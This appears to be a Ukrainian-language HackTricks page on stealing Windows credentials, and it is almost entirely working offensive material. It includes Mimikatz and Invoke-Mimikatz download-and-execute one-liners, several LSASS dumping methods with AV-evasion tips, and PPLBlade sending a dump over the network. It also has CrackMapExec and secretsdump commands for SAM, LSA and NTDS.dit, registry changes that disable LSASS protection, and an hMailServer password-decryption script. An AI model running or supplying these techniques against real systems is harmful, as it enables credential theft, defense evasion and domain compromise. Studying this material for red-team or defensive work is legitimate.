# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Дізнайтеся про інші можливості Mimikatz на** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Дізнайтеся про деякі можливі захисти credentials тут.**](credentials-protections.md) **Ці захисти можуть перешкодити Mimikatz у витяганні деяких credentials.**

## Credentials with Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **search for passwords and hashes** всередині жертви.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump з** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, його не виявляє Defender.\
Ви можете використовувати цей інструмент, щоб **dump the lsass process**, **download the dump** і **extract** **credentials локально** з dump.

Також можна використовувати [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **позначати** як **шкідливе** використання **procdump.exe to dump lsass.exe**, це відбувається тому, що вони **виявляють** рядок **"procdump.exe" and "lsass.exe"**. Тому більш **непомітно** **передавати** як **аргумент** **PID** lsass.exe до procdump **замість** **імені lsass.exe.**

### Створення дампу lsass за допомогою **comsvcs.dll**

DLL з назвою **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі збою. Ця DLL включає **функцію** з назвою **MiniDumpW**, призначену для виклику через `rundll32.exe`.\
Перші два аргументи несуттєві, але третій розділений на три компоненти. Ідентифікатор процесу, який потрібно зняти, є першою компонентою, місце розташування файлу дампу — другою, а третя компонента має бути строго словом **full**. Інших опцій немає.\
Після розбору цих трьох компонент DLL створює файл дампу і копіює в нього пам'ять вказаного процесу.\
Використання **comsvcs.dll** можливе для дампу процесу lsass, що усуває необхідність завантажувати та виконувати procdump. Цей метод детально описаний на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Для виконання використовується наступна команда:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Зняття дампу lsass за допомогою Task Manager**

1. Клацніть правою кнопкою миші на Task Bar і виберіть Task Manager
2. Натисніть More details
3. Знайдіть процес "Local Security Authority Process" на вкладці Processes
4. Клацніть правою кнопкою миші на процесі "Local Security Authority Process" і виберіть "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — цифрово підписаний виконуваний файл Microsoft, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це Protected Process Dumper Tool, який підтримує obfuscating memory dump та передачу їх на віддалені workstations без запису на диск.

**Ключові функції**:

1. Bypassing PPL protection
2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – дамп LSASS через SSP без виклику MiniDumpWriteDump

Ink Dragon поставляє трьохетапний дампер з назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки на цей API не спрацьовують:

1. **Stage 1 loader (`lals.exe`)** – шукає в `fdp.dll` плейсхолдер, що складається з 32 малих літер `d`, перезаписує його абсолютним шляхом до `rtu.txt`, зберігає патчений DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливу DLL як новий Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, XOR-ить кожен байт з `0x20` і відображає декодований бінарний блок у пам'ять перед передачею виконання.
3. **Stage 3 dumper** – відображений payload повторно реалізує логіку MiniDump, використовуючи **direct syscalls**, resolved from hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Виділений експорт з іменем `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснутий дамп LSASS у файл і закриває дескриптор, щоб ексфільтрація могла відбутися пізніше.

Примітки оператора:

* Тримайте `lals.exe`, `fdp.dll`, `nfdp.dll`, and `rtu.txt` в одній директорії. Stage 1 перезаписує жорстко закодований плейсхолдер абсолютним шляхом до `rtu.txt`, тому розділення файлів порушує ланцюжок.
* Реєстрація відбувається шляхом додавання `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете встановити це значення самостійно, щоб змусити LSASS перезавантажувати SSP при кожному завантаженні.
* `%TEMP%\*.ddt` файли — це стиснуті дампи. Розпакуйте локально, потім передайте їх у Mimikatz/Volatility для витягання облікових даних.
* Запуск `lals.exe` вимагає прав admin/SeTcb, щоб виклик `AddSecurityPackageA` пройшов успішно; коли виклик повернеться, LSASS прозоро завантажує скомпрометований SSP і виконує Stage 2.
* Видалення DLL з диска не вивантажує її з LSASS. Або видаліть запис у реєстрі і перезапустіть LSASS (reboot), або залиште її для довгострокової персистенції.

## CrackMapExec

### Отримання SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit з цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump історії паролів NTDS.dit з цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ці файли повинні бути **розташовані** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM_. Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб отримати ці файли — зробити їх копію з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ті файли на вашу машину Kali та **витягніть hashes** використовуючи:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Ви можете копіювати захищені файли за допомогою цієї служби. Вам потрібно мати права Адміністратора.

#### Using vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але те саме можна зробити і з **Powershell**. Нижче приклад того, **як скопіювати SAM file** (жорсткий диск, що використовується — "C:", і файл збережено в C:\users\Public), але це можна використати для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Код з книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Нарешті, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб зробити копію SAM, SYSTEM та ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Файл **NTDS.dit** вважається серцем **Active Directory**, що містить критичні дані про об'єкти користувачів, групи та їх членства. Саме тут зберігаються **password hashes** для доменних користувачів. Цей файл — база даних **Extensible Storage Engine (ESE)** і розташований за адресою **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних підтримуються три основні таблиці:

- **Data Table**: ця таблиця відповідає за зберігання відомостей про об'єкти, такі як користувачі та групи.
- **Link Table**: відстежує зв'язки, наприклад членство в групах.
- **SD Table**: тут зберігаються **security descriptors** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, і він використовується _lsass.exe_. Тому **частина** файлу **NTDS.dit** може знаходитися **всередині пам'яті `lsass`** (ймовірно, можна знайти останні доступні дані через підвищення продуктивності за рахунок використання **кеша**).

#### Розшифровка хешів всередині NTDS.dit

Хеш зашифрований 3 рази:

1. Розшифрувати Password Encryption Key (**PEK**) за допомогою **BOOTKEY** та **RC4**.
2. Розшифрувати **hash** за допомогою **PEK** та **RC4**.
3. Розшифрувати **hash** за допомогою **DES**.

**PEK** має **те саме значення** на **кожному контролері домену**, але він **зашифрований** всередині файлу **NTDS.dit** з використанням **BOOTKEY** файлу **SYSTEM** контролера домену (відрізняється між контролерами домену). Саме тому, щоб отримати облікові дані з файлу NTDS.dit, **вам потрібні файли NTDS.dit і SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Доступно з Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використати прийом [**volume shadow copy**](#stealing-sam-and-system) для копіювання файлу **ntds.dit**. Пам'ятайте, що вам також знадобиться копія **SYSTEM file** (знову ж таки, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) прийом).

### **Вилучення hashes з NTDS.dit**

Після того як ви **отримали** файли **NTDS.dit** та **SYSTEM**, ви можете використати інструменти, такі як _secretsdump.py_, щоб **витягти hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **автоматично витягнути їх**, використовуючи дійсного користувача domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих NTDS.dit файлів** рекомендується витягувати їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Нарешті, ви також можете використати **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Витягнення об'єктів домену з NTDS.dit до бази даних SQLite**

Об'єкти NTDS можна експортувати до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Експортуються не лише секрети, але й самі об'єкти та їхні атрибути для подальшого вилучення інформації, коли сирий файл NTDS.dit уже отримано.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive є необов'язковим, але дозволяє розшифровувати секрети (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Разом з іншою інформацією витягуються такі дані: облікові записи користувачів і машин з їхніми хешами, UAC flags, мітки часу останнього входу та зміни пароля, опис облікових записів, імена, UPN, SPN, групи та рекурсивне членство, дерево організаційних одиниць і членство, довірені домени з типом довірчих відносин, напрямком та атрибутами...

## Lazagne

Download the binary from [тут](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей бінарний файл для витягання облікових даних із різного програмного забезпечення.
```
lazagne.exe all
```
## Інші інструменти для витягання облікових даних з SAM та LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для витягання облікових даних з пам'яті. Завантажити його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Витягує облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягти облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Завантажте його з:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **запустіть його** — паролі будуть витягнуті.

## Mining idle RDP sessions and weakening security controls

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – парсіть кожен user hive за адресою `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підключ зберігає назву сервера, `UsernameHint` та час останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – опитайтеся до журналу `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` за Event IDs **21** (successful logon) та **25** (disconnect), щоб відстежити, хто адміністрував машину:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Коли ви знатимете, який Domain Admin підключається регулярно, дампьте LSASS (через LalsDumper/Mimikatz), поки їхня **відключена** сесія ще існує. CredSSP + NTLM fallback залишає їхній verifier та токени в LSASS, які потім можуть бути відтворені через SMB/WinRM, щоб отримати `NTDS.dit` або встановити persistence на domain controllers.

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Встановлення `DisableRestrictedAdmin=1` змушує повне повторне використання облікових даних/квитків під час RDP, дозволяючи pivots у стилі pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, тож локальні адміністратори отримують необмежені токени по мережі.
* `DSRMAdminLogonBehavior=2` дозволяє адміністратору DSRM входити, поки DC онлайн, надаючи нападнику ще один вбудований обліковий запис з високими привілеями.
* `RunAsPPL=0` знімає захист LSASS PPL, роблячи доступ до пам'яті тривіальним для дамперів, таких як LalsDumper.

## hMailServer database credentials (post-compromise)

hMailServer зберігає пароль БД у `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` під `[Database] Password=`. Значення зашифроване Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і має перестановку порядку байтів для 4-байтових слів. Використайте hex string з INI з цим Python-скриптом:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Маючи clear-text password, скопіюйте базу даних SQL CE, щоб уникнути блокувань файлів; завантажте 32-bit provider і, при потребі, виконайте upgrade перед запитом hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Стовпець `accountpassword` використовує hMailServer hash format (hashcat mode `1421`). Cracking цих значень може надати reusable credentials для WinRM/SSH pivots.
## Посилання

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
